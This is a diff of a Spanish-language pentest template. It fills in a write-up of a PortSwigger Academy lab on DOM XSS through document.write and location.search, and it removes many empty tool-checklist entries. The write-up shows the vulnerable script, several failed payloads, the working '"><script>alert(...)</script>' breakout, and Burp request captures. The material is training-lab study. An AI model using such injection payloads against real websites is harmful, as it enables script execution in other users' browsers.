@@ -4,9 +4,9 @@
 
 <details>
 
-<summary>👁️ RECONOCIMIENTO PASIVO</summary>
+<summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-## AUDITORIA DE: ((RELEVANT))
+## AUDITORIA DE: ((Laboratorio: DOM XSS en document.write el fregadero usando la fuente location.search))
 
 ***
 
@@ -14,202 +14,59 @@
 
 ### RECONOCIMIENTO PASIVO
 
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+
+
+### RECONOCIMIENTO PASIVO
+
+*   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    ANALIZANDO SCRIPT DE JAVASCRIPT QUE MANEJA LAS BUSQUEDAS PARA MOSTRARLAS EN ELDOM O SITIO:
+
+
+
+    function trackSearch(query) {
+            
+                document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+            }
+            
+            var query = (new URLSearchParams(window.location.search)).get('search');
+            
+            if(query) {
+                trackSearch(query);
+            }
+                      
+                      
+
+
+    PROBANDO EN EL BROWSER DISTINTOS PAYLOADS:
+
+                      
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search=%22%3Cscript%3Ealert(%27P4IM0N%27);%3C/script%3E  NO
+
+
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="<script>alert('P4IM0N');</script> NO
+
+
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="<scr<script>ipt>alert('P4IM0N');</scr</script>ipt>  NO
+
+
+    "<sscrcscrrscr<script>ipt>alert('P4IM0N');</sscrcscrrscr</script>ipt> NO
+
+
+    FUNCIONO:
+
+    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="><script>alert('¡P4IM0N-XSS!')</script> SI
+
     ```
 
-    * CONCLUSION:
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+    * CONCLUSION: LUEGO DE ANALIZAR EL SCRIPT Y COMO TRATA NUESTRA BUSQUEDA DENTRO DEL MISMO QUE CORRE SOBRE L MISMSO DOM, VEMOS QUE SI INGRESAMOS: "> CONJUNTAMENTE CON NUESTRO PAYLOAD : alert('¡P4IM0N-XSS!') , LO QUE LOGRAMOS HACER ES CERRAR LA RUTA DE SEARCHTERM Y CERRAR LA ETIQUETA IMG PARA QUE NUESTRO PAYLOAD SE EJECUTE E INGRESE EN EL DOM Y RESOLVIMOS EL LABORATORIO.
+    *
 
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WAYBACKMACHINE👈 --------------------------------->[https://archive.org/web/](https://archive.org/web/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] MALTEGO👈 --------------------------------->[https://www.maltego.com/](https://www.maltego.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] CENSYS👈 --------------------------------->[https://search.censys.io/](https://search.censys.io/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WEB-CHECK👈 --------------------------------->[https://web-check.xyz/](https://web-check.xyz/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] THEHARVESTER👈 --------------------------------->[https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WAPPALYZER👈 --------------------------------->[https://www.wappalyzer.com/](https://www.wappalyzer.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DNSdumpster👈 --------------------------------->[https://dnsdumpster.com/](https://dnsdumpster.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] ROBTEX👈 --------------------------------->[https://www.robtex.com/#google\_vignette](https://www.robtex.com/#google\_vignette)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WHOIS👈 --------------------------------->[https://who.is/](https://who.is/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NSLOOKUP👈 --------------------------------->[https://www.nslookup.io/](https://www.nslookup.io/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GHUNT👈 --------------------------------->[https://github.com/mxrch/GHunt](https://github.com/mxrch/GHunt)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] LLANTUN👈 --------------------------------->[https://github.com/lesandcl/Llaitun](https://github.com/lesandcl/Llaitun)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DISCOVER👈 --------------------------------->[https://github.com/leebaird/discover](https://github.com/leebaird/discover)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SHERLOCK👈 --------------------------------->[https://github.com/sherlock-project/sherlock](https://github.com/sherlock-project/sherlock)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WHATWEB👈 --------------------------------->[https://www.kali.org/tools/whatweb/](https://www.kali.org/tools/whatweb/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DIAGRAMAS👈 --------------------------------->[https://app.diagrams.net/](https://app.diagrams.net/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] P4INformesmentales👈 --------------------------------->[https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
+        <figure><img src="../../../.gitbook/assets/DOM-XSS (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -225,7 +82,7 @@
 
 <details>
 
-<summary>🔬 ANALISIS FORENSE</summary>
+<summary>🔬 ANALISIS FORENSE ❌</summary>
 
 ### ANALISIS FORENSE
 
@@ -424,430 +281,159 @@
 
 <details>
 
-<summary>👊 RECONOCIMIENTO ACTIVO</summary>
+<summary>👊 RECONOCIMIENTO ACTIVO ✔️</summary>
 
 ### RECONOCIMIENTO ACTIVO
 
-*   [ ] PING👈 --------------------------------->[https://www.kali.org/tools/fping/](https://www.kali.org/tools/fping/)
+
+
+*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    REQUEST EN BUSQUEDA NORMAL:
+
+
+
+
+    GET /?search=elixir HTTP/2
+    Host: 0a6000e604685435839f87cc004a0084.web-security-academy.net
+    Cookie: session=SeBs4anKs7nJTgKJ2MfEbzg8FRcgEEC1
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a6000e604685435839f87cc004a0084.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    Connection: close
+
+
+
+
+    RESPONSE 
+
+
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 3654
+
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labsBlog.css rel=stylesheet>
+            <title>DOM XSS in document.write sink using source location.search</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="blog">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <section class=blog-header>
+                            <h1>0 search results for 'elixir'</h1>
+                            <hr>
+                        </section>
+                        <section class=search>
+                            <form action=/ method=GET>
+                                <input type=text placeholder='Search the blog...' name=search>
+                                <button type=submit class=button>Search</button>
+                            </form>
+                        </section>
+                        <script>
+                            function trackSearch(query) {
+                                document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+                            }
+                            var query = (new URLSearchParams(window.location.search)).get('search');
+                            if(query) {
+                                trackSearch(query);
+                            }
+                        </script>
+                        <section class="blog-list no-results">
+                            <div class=is-linkback>
+            <a href="/">Back to Blog</a>
+                            </div>
+                        </section>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+
+
+    ------
+
+
+
+    REQUEST CON PAYLOAT ALERT:
+
+
+
+
+    GET /?search="><script>alert('¡P4IM0N-XSS!')</script> HTTP/2
+    Host: 0a6000e604685435839f87cc004a0084.web-security-academy.net
+    Cookie: session=SeBs4anKs7nJTgKJ2MfEbzg8FRcgEEC1
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a6000e604685435839f87cc004a0084.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
     ```
 
-    * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
+    * CONCLUSION: LUEGO DE ANALIZAR EL SCRIPT Y COMO TRATA NUESTRA BUSQUEDA DENTRO DEL MISMO QUE CORRE SOBRE L MISMSO DOM, VEMOS QUE SI INGRESAMOS: "> CONJUNTAMENTE CON NUESTRO PAYLOAD : alert('¡P4IM0N-XSS!') , LO QUE LOGRAMOS HACER ES CERRAR LA RUTA DE SEARCHTERM Y CERRAR LA ETIQUETA IMG PARA QUE NUESTRO PAYLOAD SE EJECUTE E INGRESE EN EL DOM Y RESOLVIMOS EL LABORATORIO.
+    *
 
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NESSUS👈 --------------------------------->[https://es-la.tenable.com/products/nessus/nessus-essentials](https://es-la.tenable.com/products/nessus/nessus-essentials)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] OPENVAS👈 --------------------------------->[https://github.com/greenbone/openvas-scanner](https://github.com/greenbone/openvas-scanner)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NIKTO👈 --------------------------------->[https://github.com/sullo/nikto](https://github.com/sullo/nikto)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] OWASP ZAP👈 --------------------------------->[https://github.com/zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DIRBUSTER👈 --------------------------------->[https://github.com/KajanM/DirBuster](https://github.com/KajanM/DirBuster)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DIRBUSTER👈 --------------------------------->[https://github.com/KajanM/DirBuster](https://github.com/KajanM/DirBuster)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WPSCAN👈 --------------------------------->[https://wpscan.com/register/](https://wpscan.com/register/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] JOOMSCAN👈 --------------------------------->[https://www.kali.org/tools/joomscan/](https://www.kali.org/tools/joomscan/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GOBUSTER👈 --------------------------------->[https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GOBUSTER👈 --------------------------------->[https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TRACEROUTE👈 --------------------------------->[https://www.kali.org/tools/traceroute/](https://www.kali.org/tools/traceroute/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SMBCLIENT👈 --------------------------------->[https://www.kali.org/tools/samba/](https://www.kali.org/tools/samba/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SMBCLIENT👈 --------------------------------->[https://www.kali.org/tools/samba/](https://www.kali.org/tools/samba/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SMBCLIENT👈 --------------------------------->[https://www.kali.org/tools/samba/](https://www.kali.org/tools/samba/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TELNET👈 --------------------------------->[https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux](https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TELNET👈 --------------------------------->[https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux](https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TELNET👈 --------------------------------->[https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux](https://wowgold-seller.com/es/stories/133-how-to-install-and-use-telnet-on-kali-linux)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] FTP👈 --------------------------------->[https://www.kali.org/tools/netkit-ftp/](https://www.kali.org/tools/netkit-ftp/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] FTP👈 --------------------------------->[https://www.kali.org/tools/netkit-ftp/](https://www.kali.org/tools/netkit-ftp/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] FTP👈 --------------------------------->[https://www.kali.org/tools/netkit-ftp/](https://www.kali.org/tools/netkit-ftp/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TCPDUMP👈 --------------------------------->[https://www.kali.org/tools/tcpdump/](https://www.kali.org/tools/tcpdump/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TCPDUMP👈 --------------------------------->[https://www.kali.org/tools/tcpdump/](https://www.kali.org/tools/tcpdump/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TCPDUMP👈 --------------------------------->[https://www.kali.org/tools/tcpdump/](https://www.kali.org/tools/tcpdump/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
